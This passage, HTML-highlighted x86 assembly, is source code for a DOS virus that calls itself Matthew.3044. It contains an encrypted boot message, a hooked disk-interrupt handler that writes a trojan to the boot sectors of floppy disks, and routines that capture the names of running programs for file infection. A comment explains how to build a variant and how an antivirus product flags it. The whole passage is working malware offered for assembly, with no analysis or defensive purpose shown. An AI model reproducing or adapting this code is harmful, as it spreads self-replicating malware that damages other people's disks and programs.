   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">0f2h</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">92h</span><span class="sc4">,</span><span class="sc2">8ah</span><span class="sc4">,</span><span class="sc2">9ch</span><span class="sc4">,</span><span class="sc2">97h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">92h</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">90h</span><span class="sc4">,</span><span class="sc2">8dh</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">89h</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc4">,</span><span class="sc2">93h</span><span class="sc4">,</span><span class="sc2">8ah</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc4">,</span><span class="sc2">9dh</span><span class="sc4">,</span><span class="sc2">93h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">97h</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">91h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">97h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc4">,</span><span class="sc2">0c0h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">0f2h</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc0"> </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3ch</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">4bh</span><span class="sc4">,</span><span class="sc2">0f2h</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0b2h</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">97h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">88h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0c9h</span><span class="sc4">,</span><span class="sc2">0c5h</span><span class="sc4">,</span><span class="sc2">0cdh</span><span class="sc4">,</span><span class="sc2">0c9h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0ceh</span><span class="sc4">,</span><span class="sc2">8ch</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0bdh</span><span class="sc4">,</span><span class="sc2">9eh</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">0c6h</span><span class="sc0">    </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0cbh</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0d7h</span><span class="sc4">,</span><span class="sc2">0ach</span><span class="sc4">,</span><span class="sc2">88h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0d9h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0ach</span><span class="sc4">,</span><span class="sc2">97h</span><span class="sc4">,</span><span class="sc2">0d6h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">4ch</span><span class="sc4">,</span><span class="sc2">0f2h</span><span class="sc0">   </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc2">3fh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">     </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc0">  </span><span class="sc1">;</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0">  </span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">3bh</span><span class="sc4">,</span><span class="sc2">26h</span><span class="sc0">                                                  </span><span class="sc1">;</span><span class="sc0">
 </span><span class="sc1">;==========================================================================;</span><span class="sc0">
 </span><span class="sc1">;&gt; Use this to create Matthew.3044 with the corrupted message.            &lt;|</span><span class="sc0">
 </span><span class="sc1">;&gt; In some places, Matthew.3044 with corrupted message is more common.    &lt;|</span><span class="sc0">
 </span><span class="sc1">;&gt; Frisk's F-Prot flags this as Matthew.3044.unknown                      &lt;|</span><span class="sc0">
 </span><span class="sc1">;==========================================================================;</span><span class="sc0">
 </span><span class="sc1">;  db  25h,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh</span><span class="sc0">
 </span><span class="sc1">;  db  3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh</span><span class="sc0">
 </span><span class="sc1">;  db  3bh,3bh,3bh,3bh,40h,0f2h,0f5h,4ch,0dfh,0b3h,90h,90h,94h,0dfh,9eh</span><span class="sc0">
 </span><span class="sc1">;  db  8bh,0dfh,8bh,97h,9ah,0dfh,9dh,96h,8dh,9bh,8ch,0dfh,90h,99h,0dfh</span><span class="sc0">
 </span><span class="sc1">;  db  8bh,97h,9ah,0dfh,9eh,96h,8dh,0d3h,0dfh,0dfh,0dfh,0dfh,0dfh,4ch,0f2h</span><span class="sc0">
 </span><span class="sc1">;  db  0f5h,4ch,0dfh,43h,74h,72h,6ch,2dh,41h,6ch,74h,2dh,4ch,65h,66h,74h</span><span class="sc0">
 </span><span class="sc1">;  db  53h,68h,69h,66h,74h,2dh,52h,69h,67h,68h,74h,53h,68h,69h,66h,74h,24h</span><span class="sc0">
 </span><span class="sc1">;  db  8dh,9ah,0dfh,0dfh,4ch,0f2h,0f5h,4ch,0dfh,9eh,88h,9eh,86h,0dfh,96h</span><span class="sc0">
 </span><span class="sc1">;  db  91h,0dfh,9dh,9eh,8dh,91h,8ch,0d3h,0dfh,86h,9ah,8bh,0dfh,86h,90h,8ah</span><span class="sc0">
 </span><span class="sc1">;  db  8dh,0dfh,0b7h,9ah,9eh,89h,9ah,91h,93h,86h,0dfh,0dfh,4ch,0f2h,0f5h</span><span class="sc0">
 </span><span class="sc1">;  db  4ch,0dfh,0b9h,9eh,8bh,97h,9ah,8dh,0dfh,99h,9ah,9ah,9bh,8ch,0dfh,8bh</span><span class="sc0">
 </span><span class="sc1">;  db  97h,9ah,92h,0d1h,0dfh,0beh,8dh,9ah,0dfh,86h,90h,8ah,0dfh,91h,90h,8bh</span><span class="sc0">
 </span><span class="sc1">;  db  0dfh,0dfh,0dfh,0dfh,4ch,0f2h,0f5h,4ch,0dfh,92h,8ah,9ch,97h,0dfh,92h</span><span class="sc0">
 </span><span class="sc1">;  db  90h,8dh,9ah,0dfh,89h,9eh,93h,8ah,9eh,9dh,93h,9ah,0dfh,8bh,97h,9eh</span><span class="sc0">
 </span><span class="sc1">;  db  91h,0dfh,8bh,97h,9ah,86h,0c0h,0dfh,0dfh,0dfh,0dfh,0dfh,4ch,0f2h,0f5h</span><span class="sc0">
 </span><span class="sc1">;  db  3ch,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh</span><span class="sc0">
 </span><span class="sc1">;  db  3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh</span><span class="sc0">
 </span><span class="sc1">;  db  3bh,3bh,4bh,0f2h,0f5h,4ch,0dfh,0b2h,9eh,8bh,8bh,97h,9ah,88h,0dfh</span><span class="sc0">
 </span><span class="sc1">;  db  0c9h,0c5h,0cdh,0c9h,0dfh,0ceh,8ch,8bh,0dfh,0bdh,9eh,8bh,0d1h,0c6h</span><span class="sc0">
 </span><span class="sc1">;  db  0cbh,0dfh,0d7h,0ach,88h,0dfh,0d9h,0dfh,0ach,97h,0d6h,0dfh,4ch,0f2h</span><span class="sc0">
 </span><span class="sc1">;  db  0f5h,3fh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh</span><span class="sc0">
 </span><span class="sc1">;  db  3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh,3bh</span><span class="sc0">
 </span><span class="sc1">;  db  3bh,3bh,3bh,3bh,26h</span><span class="sc0">
 </span><span class="sc1">;--------------------------------------------------------------------------;</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- encrypted System Disk Needed...</span><span class="sc0">
 </span><span class="sc5">BootMessage</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0f2h</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc2">0f2h</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc2">0ach</span><span class="sc4">,</span><span class="sc2">86h</span><span class="sc4">,</span><span class="sc2">8ch</span><span class="sc4">,</span><span class="sc2">8bh</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">92h</span><span class="sc4">,</span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0bbh</span><span class="sc4">,</span><span class="sc2">96h</span><span class="sc4">,</span><span class="sc2">8ch</span><span class="sc4">,</span><span class="sc2">94h</span><span class="sc0">
    </span><span class="sc9">db</span><span class="sc0">   </span><span class="sc2">0dfh</span><span class="sc4">,</span><span class="sc2">0b1h</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">9bh</span><span class="sc4">,</span><span class="sc2">9ah</span><span class="sc4">,</span><span class="sc2">9bh</span><span class="sc4">,</span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">0d1h</span><span class="sc4">,</span><span class="sc2">0f2h</span><span class="sc4">,</span><span class="sc2">0f5h</span><span class="sc4">,</span><span class="sc2">5dh</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- trojan display char routine</span><span class="sc0">
 </span><span class="sc5">DisplayChar</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0eh</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc2">16h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">10h</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- display message on boot</span><span class="sc0">
 </span><span class="sc5">ShowBibleTract</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">5dh</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">DonePreaching</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">not</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DisplayChar</span><span class="sc0">
       </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">ShowBibleTract</span><span class="sc0">
 </span><span class="sc5">DonePreaching</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- dummy for call $+3 + pop</span><span class="sc0">
 </span><span class="sc5">CallPop</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DoPop</span><span class="sc0">
 
 </span><span class="sc5">TrojanStart</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ss</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">sp</span><span class="sc4">,</span><span class="sc2">7c00h</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CallPop</span><span class="sc0">
 </span><span class="sc5">DoPop</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,(</span><span class="sc5">DoPop</span><span class="sc4">-</span><span class="sc5">MatthewMessEncrypt</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">                        </span><span class="sc1">; set offset of text</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
 </span><span class="sc5">RepeatKuno</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ShowBibleTract</span><span class="sc0">            </span><span class="sc1">; display text</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">16h</span><span class="sc0">                       </span><span class="sc1">; pause</span><span class="sc0">
       </span><span class="sc6">int</span><span class="sc0">     </span><span class="sc2">19h</span><span class="sc0">                       </span><span class="sc1">; load another boot sector</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">RepeatKuno</span><span class="sc0">
 
 </span><span class="sc5">DiskBootSig</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0aa55h</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- write trojan to boot sector</span><span class="sc0">
 </span><span class="sc5">WriteTrojan</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">isTrojan</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">301h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">pushf</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DiskInterrupt</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- preserve diskette bpb</span><span class="sc0">
 </span><span class="sc5">CopyDisketteBpb</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DisketteBpb</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndVirusCode</span><span class="sc4">+</span><span class="sc2">3</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,(</span><span class="sc5">MatthewMessEncrypt</span><span class="sc4">-</span><span class="sc5">DisketteBpb</span><span class="sc4">)</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- read boot sector</span><span class="sc0">
 </span><span class="sc5">ReadBootSector</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndVirusCode</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">201h</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dh</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
       </span><span class="sc6">pushf</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DiskInterrupt</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">DropTrojan</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ax</span><span class="sc0">                   </span><span class="sc1">; save registers</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DropTrojanFlag</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">     </span><span class="sc1">; set dropping trojan flag</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">ReadBootSector</span><span class="sc0">       </span><span class="sc1">; read boot sector</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">CopyDisketteBpb</span><span class="sc0">      </span><span class="sc1">; copy disk's bpb</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">WriteTrojan</span><span class="sc0">          </span><span class="sc1">; drop the trojan</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">DropTrojanFlag</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">     </span><span class="sc1">; clear dropping trojan flag</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc0">                   </span><span class="sc1">; restore registers</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- int 8 handler</span><span class="sc0">
 </span><span class="sc5">isDisk</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">pushf</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">                      </span><span class="sc1">; reset disk?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">PassToDisk</span><span class="sc0">                </span><span class="sc1">; exit if no</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">test</span><span class="sc0">    </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">80h</span><span class="sc0">                    </span><span class="sc1">; is it a hard disk?</span><span class="sc0">
       </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">PassToDisk</span><span class="sc0">                </span><span class="sc1">; if yes, exit</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">dl</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                      </span><span class="sc1">; drive a: or b: ?</span><span class="sc0">
       </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">PassToDisk</span><span class="sc0">                </span><span class="sc1">; if no, exit</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">nop</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DropTrojan</span><span class="sc0">                </span><span class="sc1">; then drop trojan</span><span class="sc0">
 </span><span class="sc5">PassToDisk</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">popf</span><span class="sc0">
       </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">DiskInterrupt</span><span class="sc0">
 
 </span><span class="sc1">;---------------------------------------- copy executing program's name</span><span class="sc0">
 </span><span class="sc5">CopyPreyNameToAsciiz</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">cs</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">VirusAsciiz</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ds</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">es</span><span class="sc4">,</span><span class="sc8">ax</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">si</span><span class="sc4">,</span><span class="sc8">dx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">80</span><span class="sc0">
       </span><span class="sc6">cld</span><span class="sc0">
       </span><span class="sc6">repe</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
 </span><span class="sc5">MovePointerBegin</span><span class="sc4">:</span><span class="sc0">
       </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">dx</span><span class="sc4">,</span><span class="sc8">cx</span><span class="sc0">
       </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">4200h</span><span class="sc0">                  </span><span class="sc1">; move file pointer to</span><span class="sc0">
       </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">UseDos</span><span class="sc0">                    </span><span class="sc1">; start of program</span><span class="sc0">
       </span><span class="sc6">ret</span><span class="sc0">
 
